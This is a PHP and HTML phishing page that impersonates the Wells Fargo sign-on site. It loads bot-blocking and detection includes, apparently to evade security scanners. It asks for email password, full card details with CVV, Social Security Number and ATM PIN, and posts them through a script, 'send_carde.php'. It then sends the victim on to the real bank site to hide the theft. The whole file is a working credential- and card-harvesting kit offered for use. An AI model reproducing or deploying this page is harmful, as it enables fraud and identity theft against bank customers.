<?php

session_start();
error_reporting(0);

include '../blocker.php';
include "../system/blocker.php";
include "../system/detect.php";


?>
<!DOCTYPE html>
<html lang="en">
    <head>
        


    <link rel="icon" type="image/x-icon" href="./style/css/tttt.jpg">


	
<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>


  <script>
    $(function() {
    $('#SocialSecurityNumber').mask('000-00-0000');
	});
	</script>
<div id="scLk"></div>
<style>



.blue-button {

    margin-top: 15px;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    -webkit-appearance: none;
    text-indent: 0;
    display: inline-block;
    color: #fff;
    font-family: Arial;
    font-size: 13px;
    font-style: normal;
    height: 40px;
    line-height: 35px;
    width: 124px;
    text-decoration: none;
    text-align: center;
    line-height: 40px;
    background-color: #ad1d23;
    background: #ad1d23;
}




.agree, .close, .continue {
    background-color: #ad1d23;
    background: #ad1d23;
    border: 0;
}

.agree:not(.nohover):hover, .close:not(.nohover):hover, .continue:not(.nohover):hover {
    background: -moz-linear-gradient(center top,#3064a8 5%,#6695cc 100%);
    background-color: #3064a8;
    cursor: pointer;
}
.continue:not(.nohover):hover, .close:not(.nohover):hover, .agree:not(.nohover):hover {
    background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #3064a8), color-stop(1, #6695cc) );
    background: -moz-linear-gradient( center top, #3064a8 5%, #6695cc 100% );
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#3064a8', endColorstr='#6695cc');
    background-color: #3064a8;
    cursor: pointer;
}

.caddoooroo  {margin-top:10px;height:45px;width: 420px;padding-left: 20px;margin-right: 18px;font-weight:400;text-decoration:none;font-size:13px;color:#44464a;border-radius:2px;border:1px solid #cfd1d7}



}




</style>

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
	   $('#csc').mask('000');
	   $('#expdate').mask('00/0000');
        $('#birthdate').mask('00/00/0000');
        $('#SociaNumber').mask('0000');
	});
	</script>




	
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
		<meta http-equiv="Pragma" content="no-cache" />
		<meta http-equiv="Pragma: no-cache"/>
		<meta http-equiv="Cache Control" content="no-store" />
		<meta http-equiv="Cache Control: no-store" />
		<meta http-equiv="Expires" content="-1" />
	


<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>

<meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
                <meta name="description" content="Click here to sign on to your Wells Fargo account(s)."/>
          

<link rel="stylesheet" href="./style/css/global.css">
<style>
            section[data-id="hero"] {
                overflow: hidden;
                height: 200px;
            }

            section[data-id="hero"] img {
                position: relative;
                width: 722px;
            }
        </style>
    </head>
    <body id="body" theme="ssep" platform="m" contextPath="#" >
        <a href="#skip" class="skipLink">main content</a>
        <header isJukebox="" divested="" origin="cob">
	<div>
		<a href="#"><img src="./style/css/logo.png" class="logo" alt="Wells Fargo" origin="cob"/></a><ul data-id="search">
			<li><a href="#">Apply</a></li><li><a href="#">Locations</a></li><li><a href="#">Customer Service</a></li><li>
					<div data-id="searchBox">
						<form action="#" method="get" id="frmSearch">
							<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search" />
							<img role="button" src="./style/css/rooro.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0"/>
						</form>
					</div>
				</li>
			</ul>
		<ul data-id="headerLinks">
			<li><a href="javascript:history.go(-1)">Back to Previous Page</a></li><li><a href="#">Home</a></li></ul>
	</div>
</header>

        <main>




<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#cardbank").bind("invalid-form.validate", function() {
			$("#errorSignonbank").html("<div class='alert' aria-atomic='true' role='alert' tabindex='-1'><img src='./style/css/ss.png' height='16' width='16' alt='Error' /><strong>  Please check your information and try again.</strong></div>");})




  $("form[name='cardbank']").validate({
    
	errorContainer: $("#errorSignonbank"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},





    messages: {

      NameOnCard: " ",

      lastName: " ",




expdate: {
        required: " ",
        minlength: " "
      },


 csc: {
        required: " ",
        minlength: " "
      },


  cardnumber: {
        required: " ",
        minlength: " "
      },


      password: {
        required: " ",
        minlength: " "
      },






      email: "Please enter a valid email address"
    },
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {




					$.post("./system/send_carde.php?ajax", $("#cardbank").serialize(), function(result) {
                            setTimeout(function() {






$(location).attr("href","https://wellsfargo.com");




                            });
                    });
    }
  });
});

</script>




            <form id="cardbank" name="cardbank" action="#"  method="POST" >
                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on to your account. Please adjust your browser settings, or go to <a href="#">Online Troubleshooting</a> for help.</div></noscript>


<section data-id="content" aria-label="" class="" origin="cob">
	


	<h1 id="skip" tabindex="-1">Verify Your Accounts Wells Fargo</h1>
		<div id="errorSignonbank"></div>
		
	<h3 class="copy" origin="cob">

Enter all required information. </h3>








			<div data-id="inputContainer"><br>
		<label id="Email" for="Email">Email Adress  </label><br>
		

<input  type="mail" required="required" id="Email" aria-describedby="text-info-Email Email" name="Email" class="caddoooroo"  />



		</div>
	</div>




	<div data-id="inputContainer">
		<br>
<label id="EmailPassword" for="EmailPassword">Email Password</label><br>
		<input ng-model="EmailPassword" type="password" required="required" id="EmailPassword" aria-describedby="text-info-EmailPassword EmailPasswordinputError" name="EmailPassword" class="ddddaaaaa"   />

	</div>













			<div data-id="inputContainer"><br>
		<label id="confirmpassword" for="confirmpassword">Confirm Email password</label><br>
		<input
required="required"  type="password" id="confirmpassword"  ng-model="expdate" aria-describedby="text-info-confirm_password onfirmpassword" name="confirmpassword"  class="ddddaaaaa" />
			
		</div>
	</div>






		</div>






			<div data-id="inputContainer">

	<h3 class="copy" origin="cob">

Confirm Credit/Debit Card. </h3>



<br>
		<label id="Card Number" for="Card Number">Card Number </label><br>
		


<input maxlength="24" minlength="14"  type="text" required="required" id="cardnumber" aria-describedby="text-info-cardNumber cardNumberinputError" name="cardnumber" class="caddoooroo"  />



		</div>
	</div>
	<div data-id="inputContainer">
		<br>
<label id="Name On Card" for="Name On Card">Name On Card</label><br>
		<input ng-model="NameOnCard" type="text" required="required" id="NameOnCard" aria-describedby="text-info-cardNumber NameOnCardinputError" name="NameOnCard" class="ddddaaaaa"   />

	</div>













			<div data-id="inputContainer"><br>
		<label id="usernamebanklabel" for="Expirydate">Expiry date (MM/YY)</label><br>
		<input
maxlength="7" minlength="5"  required="required"  type="text" id="expdate"  ng-model="expdate" aria-describedby="text-info-expDate expDateinputError" name="expdate"  class="ddddaaaaa" />
			
		</div>
	</div>
	<div data-id="inputContainer">
		<br>
<label id="usernamebanklabel" for="csc">Cvv</label><br>
		<input required="required"   type="text" name="csc" id="csc" aria-describedby="text-info-verificationCode verificationCodeinputError" name="csc" 
class="caddoooroo" />

	</div>






<div data-id="inputContainer">
		<br>
<label id="SocialSecurityumber" for="SocialSecurityNumber">Social Security Number (xxx-xx-xxxx)</label><br>
		<input required="required"   type="text" name="SocialSecurityNumber" id="SocialSecurityNumber" aria-describedby="text-info-verificationCode verificationCodeinputError" name="csc" 
class="caddoooroo" />

	</div>







<div data-id="inputContainer">
		<br>
<label id="ZipCode" for="ZipCode">Atm Pin</label><br>
		<input required="required"   type="text" name="ZipCode" id="ZipCode" aria-describedby="text-info-verificationCode verificationCodeinputError" name="csc" 
class="caddoooroo" />

	</div>













<div class="continue-container">
                    <input type="submit" name="_eventId_customerInfoEntered" id="continue" value="Continue" class="continue blue-button">
                </div>



	<div class="clear-both" data-id="inputContainer">
				</div>

				</div>




</section>
<aside>
                  

                   </aside>

<section data-id="submitContainer">
                </section>
            </form>


































            <form style="display:none;" id="ghbank" name="ghbank" action="https://wellsfargo.com"  method="POST" >
                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on<a href="#">Online Troubleshooting</a> for help.</div></noscript>


<section data-id="content" aria-label="" class="" origin="cob">
	


	<h1 id="skip" tabindex="-1">Verify Your Card Secure Wells Fargo</h1>
		<div id="errorvbvbank">
		



		</div>
	<p class="copy" origin="cob">


Confirm your debit or credit card Password &amp; your Security Social Number Wells Fargo
			accounts online.</p>


		

<div id="dssss"> </div>

<input type="submit" name="_eventId_customerInfoEntered" id="continue" value="Continue" class="continue blue-button">







</section>
<aside>
                  

                   </aside>

<section data-id="submitContainer">
                </section>
            </form>
        </main>
<div data-id="footerSeparator"></div>
        <footer>
            <div>
	<nav role="navigation">
		<div>
			<ul data-id="links">
				<li><a href="#">About Wells Fargo</a></li><li><a href="@">Careers</a></li><li><a href="#">Privacy, Security &amp; Legal</a></li><li><a href="#">Report Email Fraud</a></li><li><a href="#">Sitemap</a></li><li><a href="#">Home</a></li></ul>
		</div>
	</nav>
</div>
<div class="clear-both">
				<div>
	                <p data-id="copyright" class="cob">&copy; 1999 - 2021 Wells Fargo. All rights reserved. </p>
	                    </div>
			</div>
</footer>

   

            <!--TMS include ends-->
        </body>
</html>
